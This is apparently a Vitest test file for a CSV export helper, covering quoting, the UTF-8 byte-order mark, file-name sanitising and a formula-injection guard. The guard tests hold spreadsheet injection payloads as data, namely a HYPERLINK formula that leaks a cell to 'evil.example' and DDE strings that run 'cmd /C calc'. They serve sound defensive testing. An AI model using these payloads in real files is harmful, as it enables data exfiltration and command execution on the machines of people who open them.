import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { CSV_BOM, csvCell, downloadCSV, exportRecords, toCsv } from "./export";

// Capture the CSV handed to the browser download without actually navigating. jsdom implements
// neither URL.createObjectURL nor a readable Blob, so we stub both: a FakeBlob remembers its parts
// and createObjectURL captures the instance.
let lastText: string | null = null;
let lastType: string | null = null;

class FakeBlob {
  readonly content: string;
  readonly type: string;
  constructor(parts: unknown[], opts?: { type?: string }) {
    this.content = parts.map(String).join("");
    this.type = opts?.type ?? "";
  }
}

beforeEach(() => {
  lastText = null;
  lastType = null;
  vi.stubGlobal("Blob", FakeBlob);
  (URL as unknown as { createObjectURL: unknown }).createObjectURL = vi.fn((blob: FakeBlob) => {
    lastText = blob.content;
    lastType = blob.type;
    return "blob:mock";
  });
  (URL as unknown as { revokeObjectURL: unknown }).revokeObjectURL = vi.fn();
  // jsdom anchors would try to navigate on click(); make it a no-op.
  vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => {});
});

afterEach(() => {
  vi.useRealTimers();
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
});

function csvText(): string {
  expect(lastText).not.toBeNull();
  return lastText!;
}

describe("downloadCSV", () => {
  it("writes a UTF-8 BOM, a header row, then data rows separated by CRLF", () => {
    downloadCSV("out.csv", ["Name", "Score"], [["Ada", 90], ["Bob", 80]]);
    expect(csvText()).toBe(`${CSV_BOM}Name,Score\r\nAda,90\r\nBob,80`);
    expect(lastType).toBe("text/csv;charset=utf-8;");
  });

  it("quotes and escapes cells containing commas, quotes, or line breaks", () => {
    downloadCSV("out", ["A"], [['he said "hi", loudly'], ["line1\nline2"], ["cr\ronly"]]);
    const text = csvText();
    expect(text).toContain('"he said ""hi"", loudly"');
    expect(text).toContain('"line1\nline2"');
    expect(text).toContain('"cr\ronly"');
  });

  it("renders null/undefined cells as empty strings", () => {
    downloadCSV("out", ["A", "B"], [[null, undefined]]);
    expect(csvText()).toBe(`${CSV_BOM}A,B\r\n,`);
  });

  it("keeps non-ASCII names intact (José, Bengali) behind the BOM", () => {
    downloadCSV("out", ["Member"], [["José"], ["রহিম করিম"]]);
    expect(csvText()).toBe(`${CSV_BOM}Member\r\nJosé\r\nরহিম করিম`);
  });

  it("appends a .csv extension only when missing", () => {
    const a = vi.spyOn(document.body, "appendChild");
    downloadCSV("nodotcsv", ["A"], []);
    const el1 = a.mock.calls[0][0] as HTMLAnchorElement;
    expect(el1.download).toBe("nodotcsv.csv");
    downloadCSV("already.csv", ["A"], []);
    const el2 = a.mock.calls[1][0] as HTMLAnchorElement;
    expect(el2.download).toBe("already.csv");
    downloadCSV("SHOUTED.CSV", ["A"], []);
    const el3 = a.mock.calls[2][0] as HTMLAnchorElement;
    expect(el3.download).toBe("SHOUTED.CSV");
  });

  it("replaces characters no file system accepts in the file name", () => {
    const a = vi.spyOn(document.body, "appendChild");
    downloadCSV('payroll: Acme/Ltd "Q3"?', ["A"], []);
    expect((a.mock.calls[0][0] as HTMLAnchorElement).download).toBe("payroll- Acme-Ltd -Q3--.csv");
    downloadCSV("   ", ["A"], []);
    expect((a.mock.calls[1][0] as HTMLAnchorElement).download).toBe("export.csv");
  });

  it("removes the link it clicked and releases the object URL shortly after", () => {
    vi.useFakeTimers();
    downloadCSV("out", ["A"], [["x"]]);
    expect(document.querySelector("a[download]")).toBeNull();
    expect(URL.revokeObjectURL).not.toHaveBeenCalled();
    vi.advanceTimersByTime(1000);
    expect(URL.revokeObjectURL).toHaveBeenCalledWith("blob:mock");
  });

  it("does not fail when the browser has no URL.revokeObjectURL", () => {
    vi.useFakeTimers();
    (URL as unknown as { revokeObjectURL: unknown }).revokeObjectURL = undefined;
    downloadCSV("out", ["A"], [["x"]]);
    expect(() => vi.advanceTimersByTime(1000)).not.toThrow();
  });
});

describe("formula injection guard", () => {
  it.each([
    ['=HYPERLINK("https://evil.example/?d="&E2,"View")', `"'=HYPERLINK(""https://evil.example/?d=""&E2,""View"")"`],
    ["+cmd|' /C calc'!A0", "'+cmd|' /C calc'!A0"],
    ["-2+3+cmd|' /C calc'!A0", "'-2+3+cmd|' /C calc'!A0"],
    ["@SUM(1+1)*cmd|' /C calc'!A0", "'@SUM(1+1)*cmd|' /C calc'!A0"],
    ["\t=1+1", "'\t=1+1"],
    ["\r=1+1", `"'\r=1+1"`],
  ])("neutralises a text cell starting with a formula trigger: %j", (input, expected) => {
    expect(csvCell(input)).toBe(expected);
  });

  it("leaves numbers alone, negative ones included", () => {
    expect(csvCell(-42)).toBe("-42");
    expect(csvCell(-0.5)).toBe("-0.5");
    expect(csvCell(BigInt(-7))).toBe("-7");
  });

  it("leaves text that is just a plain number alone ('-12.50' is data, not a formula)", () => {
    expect(csvCell("-12.50")).toBe("-12.50");
    expect(csvCell("-3")).toBe("-3");
  });

  it("does not touch ordinary text, or formula characters later in the cell", () => {
    expect(csvCell("Ada Lovelace")).toBe("Ada Lovelace");
    expect(csvCell("a=b")).toBe("a=b");
    expect(csvCell("user@example.com")).toBe("user@example.com");
    expect(csvCell(" =1+1")).toBe(" =1+1");
  });

  it("guards the header row too", () => {
    expect(toCsv(["=evil"], [])).toBe(`${CSV_BOM}'=evil`);
  });

  it("a hostile member name in a payroll export opens as text", () => {
    downloadCSV("payroll", ["Member", "Hours"], [['=HYPERLINK("https://evil.example","x")', 7.5]]);
    expect(csvText()).toBe(`${CSV_BOM}Member,Hours\r\n"'=HYPERLINK(""https://evil.example"",""x"")",7.5`);
  });
});

describe("exportRecords", () => {
  it("projects records through the column value functions", () => {
    const rows = [
      { first: "Ada", last: "Lovelace", n: 1 },
      { first: "Bob", last: "Ross", n: 2 },
    ];
    exportRecords("people", rows, [
      { header: "Full Name", value: (r) => `${r.first} ${r.last}` },
      { header: "N", value: (r) => r.n },
    ]);
    expect(csvText()).toBe(`${CSV_BOM}Full Name,N\r\nAda Lovelace,1\r\nBob Ross,2`);
  });
});
